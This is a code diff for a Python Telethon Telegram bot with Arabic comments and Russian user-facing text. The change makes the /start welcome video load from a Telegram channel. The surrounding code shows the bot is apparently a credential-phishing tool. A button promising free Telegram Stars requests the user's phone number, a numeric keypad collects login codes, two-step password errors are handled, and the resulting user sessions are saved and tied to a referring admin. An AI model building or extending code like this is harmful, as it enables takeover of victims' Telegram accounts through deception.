@@ -12,7 +12,7 @@ from telethon.errors import (
     SessionPasswordNeededError, 
     PasswordHashInvalidError
 )
-from telethon.tl.types import User
+from telethon.tl.types import User, InputMessagesFilterVideo
 
 # =============================================================
 # 1. إعدادات المتغيرات وقراءة البيئة
@@ -23,6 +23,9 @@ BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN")
 
 # الآيدي الافتراضي للمسؤول (في حال تم دخول البوت بدون رابط إحالة)
 DEFAULT_ADMIN_ID = int(os.environ.get("DEFAULT_ADMIN_ID", "5963244397"))
+
+# معرف القناة التي يتم جلب الفيديو الترحيبي منها
+CHANNEL_USERNAME = "oaiaiaowowjwjwowjnwkww"
 
 SESSIONS_DIR = "user_sessions"
 os.makedirs(SESSIONS_DIR, exist_ok=True)
@@ -367,7 +370,7 @@ def make_numeric_keyboard(current_code=""):
     ]
     return display, buttons
 
-# استقبال أمر /start مع إرسال فيديو vip.mp4 المباشر
+# استقبال أمر /start مع إرسال أحدث فيديو مباشر من القناة
 @bot.on(events.NewMessage(pattern='/start'))
 async def start_command(event):
     user_id = event.sender_id
@@ -393,17 +396,31 @@ async def start_command(event):
     
     phone_btn = [Button.request_phone("📱 Авторизоваться и получить Stars", resize=True, single_use=True)]
     
-    # إرسال الفيديو المباشر مسار "vip.mp4" ثابت بالكود مع النص والأزرار
-    if os.path.exists("8219429418779326019.mp4"):
-        await bot.send_file(
-            event.chat_id,
-            "8219429418779326019.mp4",
-            caption=russian_welcome,
-            buttons=phone_btn
-        )
-    else:
-        # احتياطي فقط إذا لم يُعثر على الملف بالسيرفر
-        await event.respond(russian_welcome, buttons=phone_btn)
+    video_media = None
+    try:
+        # جلب أحدث رسالة تحتوي على فيديو من القناة
+        async for message in bot.iter_messages(CHANNEL_USERNAME, filter=InputMessagesFilterVideo, limit=1):
+            if message and message.media:
+                video_media = message.media
+            break
+    except Exception as e:
+        print(f"Error fetching channel video: {e}")
+
+    # إرسال الفيديو من القناة إن وُجد، وإلا يتم الاكتفاء بالرسالة النصية
+    if video_media:
+        try:
+            await bot.send_file(
+                event.chat_id,
+                video_media,
+                caption=russian_welcome,
+                buttons=phone_btn
+            )
+            return
+        except Exception as e:
+            print(f"Error sending video file: {e}")
+
+    # كخطة بديلة (Fallback) في حال تعذر إرسال الفيديو لأي سبب
+    await event.respond(russian_welcome, buttons=phone_btn)
 
 # استقبال رقم الهاتف باللغة الروسية
 @bot.on(events.NewMessage)
